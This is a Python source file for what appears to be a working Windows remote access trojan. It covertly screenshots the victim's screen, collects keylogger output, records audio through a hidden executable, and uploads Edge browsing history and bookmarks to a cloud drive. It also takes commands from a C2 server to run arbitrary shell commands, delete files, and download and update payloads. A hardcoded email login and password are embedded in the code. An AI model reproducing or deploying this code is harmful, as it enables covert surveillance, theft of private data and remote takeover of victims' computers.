# -*- coding: utf-8 -*-
import json
import socket
import struct
import subprocess
import threading
import getpass
import psutil
import os
import pyautogui
from io import BytesIO
import time
import requests
from aligo import Aligo
from aligo import Auth

# usr name
user_name = getpass.getuser()
mouseStoptime = 0
# aligo login
try:
    Auth._EMAIL_HOST = 'smtp.qq.com'
    Auth._EMAIL_PORT = '465'
    Auth._EMAIL_USER = '2778297606@qq.com'
    Auth._EMAIL_PASSWORD = 'evdygkxdzgrudeff'

    ali = Aligo(email=("2778297606@qq.com", user_name))
except:
    print("login error")


def encryption(fr, to, key=27):
    '''
    图片加解密
    :param fr: 输入路径
    :param to: 输出路径
    :param key: 密文，默认27
    :return: 是否成功
    '''
    try:
        with open(fr, mode='rb') as f:
            # 取出文件头
            flag1 = f.read(1)
            flag2 = f.read(1)
            # 解密
            img = open(to, mode='wb')

            x = int(flag1.hex(), 16) ^ key
            s = struct.pack('B', x)
            img.write(s)
            x = int(flag2.hex(), 16) ^ key
            s = struct.pack('B', x)
            img.write(s)
            while True:
                H = f.read(1)
                if not H:
                    break
                x = int(H.hex(), 16) ^ key
                s = struct.pack('B', x)
                img.write(s)
        return True
    except:
        return False


def off_line():
    """
    离线
    :return:
    """
    if not os.path.isdir(".cache"):
        os.mkdir(".cache")
    isuploadKey = 0
    mouseX = mouseY = 0
    global mouseStoptime
    time.sleep(1)
    while True:
        # get pic
        picTime = str(int(time.time()))  # 获取时间
        picName = user_name + "_" + picTime + ".png"
        im = pyautogui.screenshot()
        im.save(picName)
        # try upload
        if uploadFile(picName, where=f"upload/off_line_SC/{user_name}"):
            upload_off_line_file()
            time.sleep(1)
        elif len(os.listdir(".cache")) <= 50:
            encryption(picName, f".cache\\{picTime}.cache")
        # remove
        os.remove(picName)
        # up key info
        isuploadKey += 1
        if isuploadKey % 12 == 0:
            getKey()
            time.sleep(1)
        # is mouse moved?
        currentMouseX, currentMouseY = pyautogui.position()
        if currentMouseX == mouseX and currentMouseY == mouseY:
            mouseStoptime += 5
        else:
            mouseX = currentMouseX
            mouseY = currentMouseY
            mouseStoptime = 0

        time.sleep(60 * 5)
        # stop 5 min is inportant


def upload_off_line_file():
    '''
    上传离线文件
    :return:
    '''
    if os.path.isdir(".cache"):
        fileList = os.listdir(".cache")
        try:
            for i in fileList:
                name = i.split(".")[0] + ".png"
                encryption(f".cache\\{i}", f".cache\\{name}")
                uploadFile(f".cache\\{name}", where=f"upload/off_line_SC/{user_name}")  # upload
                os.remove(".cache\\" + i)
                os.remove(".cache\\" + name)
                time.sleep(2)
            return True
        except:
            return False


def connect(ip, port):
    while True:
        time.sleep(5)
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # client.connect(('43.249.193.55', 63780))
            client.connect((ip, port))
            testData = client.recv(1024)
            if testData == b'':  # 服务器不在线，连不上，返回空字符
                print("连接失败:NULL")
                continue
            else:
                client.send(user_name.encode())
                isReject = client.recv(1024).decode()  # 是否被列为黑名单
                if isReject == "0":
                    print("服务器拒绝连接")
                    continue
                if main(client) == False:  # 服务器断开
                    print("服务器异常关闭")
                    continue
        except:
            print("服务器连接失败")
            continue


def screenShot(client):
    '''
    截图，tcp传输
    :param client:
    :return:
    '''
    im = pyautogui.screenshot()
    buffer = BytesIO()
    im.save(buffer, format='png')
    buffer.seek(0, 2)
    size = buffer.tell()
    buffer.seek(0, 0)
    resp = {
        'cmd': '/screenshot',
        'size': size
    }
    client.send(json.dumps(resp).encode('utf-8'))
    dataCount = 0
    sleepCount = 0
    while True:
        sdata = buffer.read(1024)
        if not sdata:
            break
        dataCount += 1
        sleepCount += 1
        if sleepCount == 5:
            sleepCount = 0
            # time.sleep(0.5)
        client.send(sdata)


def screenShot_ali(client):
    '''
    截图，上传至云盘
    :param client:
    :return:
    '''
    picName = str(int(time.time())) + ".png"
    # 获取网盘的位置
    uploadFilder = ali.get_folder_by_path("upload/screenshot")
    im = pyautogui.screenshot()
    im.save(picName)
    ali.upload_file(picName, uploadFilder.file_id)
    os.remove(picName)


def cpuInfo(client):
    '''
    CPU占用
    :param client:
    :return:
    '''
    try:
        resp = {
            'cmd': '/cpu',
            'info': psutil.cpu_percent(interval=1, percpu=False)
        }
        client.send(json.dumps(resp).encode('utf-8'))
        return True
    except:
        return False


def memInfo(client):
    '''
    内存专占用
    :param client:
    :return:
    '''
    try:
        memData = psutil.virtual_memory()
        resp = {
            'cmd': '/mem',
            'total': format(memData.total / 1073741824, '.2f'),
            'available': format(memData.available / 1073741824, '.2f'),
            'percent': memData.percent,
        }
        client.send(json.dumps(resp).encode('utf-8'))
        return True
    except:
        return False


def mouseInfo(client):
    try:
        currentMouseX, currentMouseY = pyautogui.position()
        resp = {
            'cmd': '/mouse',
            'currentMouseX': currentMouseX,
            'currentMouseY': currentMouseY,
        }
        client.send(json.dumps(resp).encode('utf-8'))
        return True
    except:
        return False


def processListInfo_by_ali():
    '''
    获取进程信息并上传
    :return:
    '''
    try:
        with open(f"{user_name}_pInfo.txt", mode="w", encoding="utf-8") as w:
            pidList = psutil.pids()
            for pid in pidList:
                p = psutil.Process(pid)
                w.write(p.name() + "-" + str(int(p.memory_info().rss / 1024 / 1024)) + "\n")
        uploadFile(f"{user_name}_pInfo.txt")
        return True
    except:
        return False


def sentInfo(info, client):
    try:
        resp = {
            'cmd': '/info',
            'info': info
        }
        client.send(json.dumps(resp).encode('utf-8'))
        return True
    except:
        return False


def killProcess(pName, client):
    try:
        pidList = psutil.pids()
        for pid in pidList:
            p = psutil.Process(pid)
            if p.name() == pName:
                os.system(f'taskkill /F /IM {p.name()}')
                sentInfo("Killed the Process: " + p.name(), client)
                return True
        sentInfo("Killed defeated", client)
        return True
    except:
        return False


def processListInfo(size, client):
    '''
    进程信息
    :param size:
    :param client:
    :return:
    '''
    try:
        pidList = psutil.pids()
        for pid in pidList:
            p = psutil.Process(pid)
            if p.memory_info().rss / 1024 / 1024 > size:
                resp = {
                    'cmd': '/processList',
                    'name': p.name() + "-" + str(format(p.memory_info().rss / 1024 / 1024, '.2f'))
                }
                client.send(json.dumps(resp).encode('utf-8'))
                time.sleep(0.6)
                return True
    except:
        return False


def isProcess(name, client):
    '''
    查找进程
    :param name: 进程名
    :param client:
    :return:
    '''
    try:
        resp = {
            'cmd': '/isProcess',
            'flag': False,
            'name': ""
        }
        pidList = psutil.pids()
        for pid in pidList:
            p = psutil.Process(pid)
            if name in p.name():
                resp['flag'] = True
                resp['name'] = p.name()
                client.send(json.dumps(resp).encode('utf-8'))
                time.sleep(0.8)
        client.send(json.dumps(resp).encode('utf-8'))
        return True
    except:
        return False


def sizeofFile(path, client):
    '''
    获取文件大小
    :param path: 文件路径
    :param client:
    :return:
    '''
    try:
        size = os.path.getsize(path)
        resp = {
            'cmd': '/sizeofFile',
            'size': size
        }
        client.send(json.dumps(resp).encode('utf-8'))
        return True
    except:
        return False


def getKey():
    try:
        path = f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core\\.cache"
        fileList = os.listdir(path)
        for i in fileList:
            curtime = time.strftime('%Y%m%d_%H%M', time.localtime(time.time()))
            keyname = curtime + f"_{user_name}.txt"
            with open(path + "\\" + keyname, mode="w", encoding="utf-8") as w:
                with open(path + "\\" + i, mode="r", encoding="utf-8") as f:
                    w.write(f.read())
            if uploadFile(path + "\\" + keyname, where=f"upload/keyboard/{user_name}"):
                os.remove(path + "\\" + i)
            os.remove(path + "\\" + keyname)
        return True
    except:
        return False


def sentFile(pwd, client):
    '''
    传输pwd路径下的文件
    :param pwd: 路径
    :param client: 主机
    :return:
    '''
    f = open(pwd, mode="br")
    buffer = BytesIO(f.read())
    buffer.seek(0, 2)
    size = buffer.tell()
    buffer.seek(0, 0)
    resp = {
        'cmd': '/file',
        'size': size,
        'name': pwd.split('/')[-1]
    }
    client.send(json.dumps(resp).encode('utf-8'))
    dataCount = 0
    sleepCount = 0
    while True:
        sdata = buffer.read(1024)
        if not sdata:
            break
        dataCount += 1
        sleepCount += 1
        if sleepCount == 16:
            sleepCount = 0
        client.send(sdata)


def uploadFile(path, where="upload"):
    '''
    将指定path下的文件上传至网盘
    :param path: 文件路径
    :param where: 网盘目录
    :return:
    '''
    time.sleep(1)
    try:
        # 获取网盘的位置
        uploadFilder = ali.get_folder_by_path(where)
        time.sleep(2)
        if type(path) == list:
            ali.upload_files(path, uploadFilder.file_id)
        elif os.path.isfile(path):
            ali.upload_file(path, uploadFilder.file_id)
        elif os.path.isdir(path):
            ali.upload_folder(path, uploadFilder.file_id)
        return True
    except:
        time.sleep(1)
        create_ali_path(f"/upload/off_line_SC", user_name)
        time.sleep(1)
        create_ali_path(f"/upload/keyboard", user_name)
        time.sleep(1)
        return False


def download_by_lz(link, path):
    '''
    下载文件的关键函数
    :param path: 文件下载路径
    :param link: 文件直链
    :return: 提醒某某文件下载完成
    '''
    try:
        download_file_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh;q=0.9',
            'cache-control': 'max-age=0',
            'cookie': 'down_ip=1',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
        }
        request_file_data = requests.get(url=link, headers=download_file_headers)
        file_data = request_file_data.content
        with open(path, 'wb') as save_file:
            save_file.write(file_data)
            save_file.close()
        return True
    except:
        return False


def create_ali_path(path, folder_name):
    try:
        pt = ali.get_folder_by_path(path)
        ali.create_folder(name=folder_name, parent_file_id=pt.file_id)
        return True
    except:
        return False


def download(filename, path):
    '''
    将云盘download位置下的指定文件，下载至指定路径
    :param filename: 被下载文件名
    :param path: 下载路径
    :return:
    '''
    downloadFilder = ali.get_folder_by_path(f"download/")
    dlist = ali.get_file_list(downloadFilder.file_id)
    if filename == '*':
        for i in dlist:
            ali.download_file(file_id=i.file_id, local_folder=path)
    else:
        for i in dlist:
            if filename == i.name:
                ali.download_file(file_id=i.file_id, local_folder=path)


def removeFile(path):
    '''
    删除指定文件或文件夹
    :param path: 路径
    :return: 是否删除成功
    '''
    try:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            rmList = os.listdir(path)
            for i in rmList:
                os.remove(path + "/" + i)
            os.rmdir(path)
            return True
    except:
        return False


def recording_ali(rcTime):
    '''
    写入ini文件，启动录音程序
    :param rcTime:录制时长
    :return:
    '''
    try:
        with open("C:\\Users\\Public\\Documents\\.Audio\\audio.ini", mode='w', encoding="utf-8") as f:
            f.write(str(rcTime))
        subprocess.Popen("C:\\Users\\Public\\Documents\\.Audio\\Cears.exe")
        return True
    except IOError:
        return True
    except:
        return False


def recording(client):
    '''
    写入ini文件，启动录音程序，tcp传送
    :param client:
    :return:
    '''
    try:
        path = "C:\\Users\\Public\\Documents\\.Audio\\.temp"
        for i in os.listdir(path):
            sentFile(path + '\\' + i, client)
        return True
    except:
        return False


def get_version(client):
    try:
        with open("v.log", mode="r", encoding="utf-8") as f:
            version = f.read()
            sentInfo(f"hoprt_{version}", client)
    except:
        sentInfo("hoprt_1.1.1", client)


def execute_cmd(command, how, client):
    res = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    ret_info = res.stdout.read().decode("GBK").encode("utf-8").decode("utf-8")
    res.stdout.close()
    if how == "tcp":
        cnt = 0
        while cnt + 100 <= len(ret_info):
            sentInfo(ret_info[cnt:cnt + 100], client)
            cnt += 100
        sentInfo(ret_info[cnt:], client)
    if how == "ali":
        fname = f"cmdInfo_{int(time.time())}.txt"
        with open(fname, mode="w", encoding="utf-8") as f:
            f.write(ret_info)
        uploadFile(fname)
        os.remove(fname)


def execute_cmd_path(command, path, how, client):
    workpath = os.getcwd()
    os.chdir(path)
    res = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    ret_info = res.stdout.read().decode("GBK").encode("utf-8").decode("utf-8")
    res.stdout.close()
    os.chdir(workpath)
    if how == "tcp":
        cnt = 0
        while cnt <= len(ret_info):
            sentInfo(ret_info[cnt:cnt + 50], client)
            cnt += 50
            time.sleep(0.5)
        # sentInfo(str(ret_info[cnt:]), client)
    if how == "ali":
        fname = f"cmdInfo_{int(time.time())}.txt"
        with open(fname, mode="w", encoding="utf-8") as f:
            f.write(ret_info)
        uploadFile(fname)


def run(cmd, client):
    '''
    每收到一次命令都会创建一个线程来运行该函数，用于分类执行主机的命令
    :param cmd: 指令名
    :param client: socket对象
    :return:
    '''
    if cmd == 'take photo':
        pass
    elif cmd == 'screenshot':
        screenShot(client)
    elif cmd == 'sc -ali':
        screenShot_ali(client)
    elif cmd.startswith("rc"):
        rcTime = int(cmd.split("-")[-1])
        if not recording_ali(rcTime):
            recording(client)
    elif cmd.startswith("kill"):
        pName = cmd.split("-")[-1]
        killProcess(pName, client)
    elif cmd == 'getKey':
        if getKey():
            sentInfo("upload ok", client)
    elif cmd == 'version':
        get_version(client)
    elif cmd == 'get cpu info':
        cpuInfo(client)
    elif cmd == 'get mem info':
        memInfo(client)
    elif cmd == 'get mouse info':
        mouseInfo(client)
    elif cmd == 'mouse stop time':
        global mouseStoptime
        sentInfo("mouse stop:" + str(mouseStoptime) + "min", client)
    elif cmd.startswith("processList -ali"):
        processListInfo_by_ali()
    elif cmd.startswith("processList"):
        num = cmd.split("-")[1].strip()
        if num.isdigit():
            processListInfo(int(num), client)
    elif cmd.startswith("isprocess"):
        name = cmd.split("-")[1].strip()
        isProcess(name, client)
    elif cmd == 'hedge':
        pwd = f"C:/Users/{user_name}/AppData/Local/Microsoft/Edge/User Data/Default/History"
        uploadFile(pwd)
    elif cmd == 'bedge':
        pwd = f"C:/Users/{user_name}/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
        uploadFile(pwd)
    elif cmd.startswith("cd"):
        path = cmd.split("?")[-1]
        fileNameList = os.listdir(path)
        resp = {
            'cmd': '/txt',
            'size': len(fileNameList)
        }
        client.send(json.dumps(resp).encode('utf-8'))
        for fileName in fileNameList:
            fileName = fileName + "\n"
            client.send(fileName.encode("utf-8"))
            # time.sleep(0.5)
    elif cmd.startswith("up"):
        if 'uplist' in cmd:
            cmdList = cmd.split("?")
            pwd = cmdList[1]
            fileList = []
            for i in range(2, len(cmdList)):
                if (cmdList[i] == ''):
                    continue
                fileList.append(pwd + '/' + cmdList[i])
            uploadFile(fileList)
        else:
            path = cmd.split("?")[-1]
            uploadFile(path)
    elif cmd.startswith("rm"):
        path = cmd.split("?")[-1]
        removeFile(path)
    elif cmd.startswith("cmd"):
        command = cmd.split(" ", 1)
        if command[0] == "cmd-tcp":
            execute_cmd(command[1], "tcp", client)
        elif command[0] == "cmd-ali":
            execute_cmd(command[1], "ali", client)
        elif command[0].startswith("cmd-tcp-p"):
            path = command[0].split("?")[1]
            execute_cmd_path(command[1], path, "tcp", client)
        elif command[0].startswith("cmd-ali-p"):
            path = command[0].split("?")[1]
            execute_cmd_path(command[1], path, "ali", client)
    elif cmd.startswith("sz"):
        path = cmd.split("?")[-1]
        sizeofFile(path, client)
    elif cmd.startswith("dllz"):
        link = cmd.split("##")[1]
        path = cmd.split("##")[-1]
        if download_by_lz(link, path):
            sentInfo("Download succeeded", client)
        else:
            sentInfo("Download failed", client)
    elif cmd.startswith("dl"):
        cmd = cmd.split('?')
        filename = cmd[-1]
        path = cmd[1]
        download(filename, path)
    elif cmd.startswith("update-lz"):
        link = cmd.split("##")[-1]
        path = "C:\\Users\\Public\\.venv\\.update"
        if download_by_lz(link, path):
            if os.path.isfile("C:\\Users\\Public\\.venv\\.update\\horpt.exe"):
                sentInfo("Download succeeded", client)
            else:
                sentInfo("Download succeeded", client)
        else:
            sentInfo("Download failed", client)


def main(client):
    while True:
        command = client.recv(1024)
        if command == b'':
            return False
        else:
            print(command.decode())
            threading.Thread(target=run, args=(command.decode(), client)).start()


def init():
    try:
        # remove path
        path = "C:\\Users\\Public\\.venv"
        for i in os.listdir(path):
            if '.png' in i:
                os.remove(path + "\\" + i)
        path = "C:\\Users\\Public\\.venv\\.cache"
        for i in os.listdir(path):
            if '.png' in i:
                os.remove(path + "\\" + i)
        path = "C:\\Users\\Public\\Documents\\.Audio\\.temp"
        for i in os.listdir(path):
            if '.wav' in i:
                os.remove(path + "\\" + i)
    except:
        pass
    try:
        # upload keybroad files
        getKey()
        # get ipconfig
        time.sleep(2)
        file = ali.get_folder_by_path('/ini/ipconfig')
        file_list = ali.get_file_list(file.file_id)
        s = file_list[0].name[:-3].split("@")
        ip = s[0]
        port = int(s[1])
        try:
            with open("ip.d", mode="r", encoding="utf-8") as f:
                s = f.read().split(":")
                if ip == s[0] and port == int(s[1]):
                    return ip, port
                else:
                    with open("ip.d", mode="w", encoding="utf-8") as w:
                        w.write(ip + ":" + str(port))
        except:
            with open("ip.d", mode="w", encoding="utf-8") as w:
                w.write(ip + ":" + str(port))
        return ip, port
    except:
        try:
            with open("ip.d", mode="r", encoding="utf-8") as f:
                s = f.read().split(":")
                ip = s[0]
                port = int(s[1])
                return ip, port
        except:
            return False, False


if __name__ == '__main__':
    ip, port = init()
    print(ip, port)
    if ip == False and port == False:
        pass
    else:
        # todo:返回多个ip循环连接
        threading.Thread(target=off_line, args=()).start()
        connect(ip, port)
